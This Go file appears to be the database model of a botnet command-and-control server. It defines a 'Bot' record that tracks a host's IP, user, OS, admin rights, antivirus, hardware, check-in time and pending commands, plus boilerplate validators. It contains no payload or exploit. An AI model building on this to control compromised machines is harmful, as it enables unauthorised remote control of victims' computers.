package models

import (
	"encoding/json"
	"time"

	"github.com/gobuffalo/pop/nulls"

	"github.com/gobuffalo/pop"
	"github.com/gobuffalo/validate"
	"github.com/gobuffalo/validate/validators"
	"github.com/gofrs/uuid"
)

type Bot struct {
	ID          uuid.UUID    `json:"id" db:"id"`
	CreatedAt   time.Time    `json:"created_at" db:"created_at"`
	UpdatedAt   time.Time    `json:"updated_at" db:"updated_at"`
	IP          string       `json:"ip" db:"ip"`
	WhoAmI      string       `json:"whoami" db:"whoami"`
	OS          string       `json:"os" db:"os"`
	InstallDate string       `json:"install_date" db:"install_date"`
	Admin       string       `json:"admin" db:"admin"`
	AV          string       `json:"av" db:"av"`
	CPU         string       `json:"cpu" db:"cpu"`
	GPU         string       `json:"gpu" db:"gpu"`
	Version     string       `json:"version" db:"version"`
	LastCheckin nulls.String `json:"last_checkin" db:"last_checkin"`
	LastCommand nulls.String `json:"last_command" db:"last_command"`
	NewCommand  nulls.String `json:"new_command" db:"new_command"`
}

// String is not required by pop and may be deleted
func (b Bot) String() string {
	jb, _ := json.Marshal(b)
	return string(jb)
}

// Bots is not required by pop and may be deleted
type Bots []Bot

// String is not required by pop and may be deleted
func (b Bots) String() string {
	jb, _ := json.Marshal(b)
	return string(jb)
}

// Validate gets run every time you call a "pop.Validate*" (pop.ValidateAndSave, pop.ValidateAndCreate, pop.ValidateAndUpdate) method.
// This method is not required and may be deleted.
func (b *Bot) Validate(tx *pop.Connection) (*validate.Errors, error) {
	return validate.Validate(
		&validators.StringIsPresent{Field: b.IP, Name: "IP"},
		&validators.StringIsPresent{Field: b.WhoAmI, Name: "WhoAmI"},
		&validators.StringIsPresent{Field: b.OS, Name: "OS"},
		&validators.StringIsPresent{Field: b.InstallDate, Name: "InstallDate"},
		&validators.StringIsPresent{Field: b.Admin, Name: "Admin"},
		&validators.StringIsPresent{Field: b.AV, Name: "AV"},
		&validators.StringIsPresent{Field: b.CPU, Name: "CPU"},
		&validators.StringIsPresent{Field: b.GPU, Name: "GPU"},
		&validators.StringIsPresent{Field: b.Version, Name: "Version"},
	), nil
}

// ValidateCreate gets run every time you call "pop.ValidateAndCreate" method.
// This method is not required and may be deleted.
func (b *Bot) ValidateCreate(tx *pop.Connection) (*validate.Errors, error) {
	return validate.NewErrors(), nil
}

// ValidateUpdate gets run every time you call "pop.ValidateAndUpdate" method.
// This method is not required and may be deleted.
func (b *Bot) ValidateUpdate(tx *pop.Connection) (*validate.Errors, error) {
	return validate.NewErrors(), nil
}
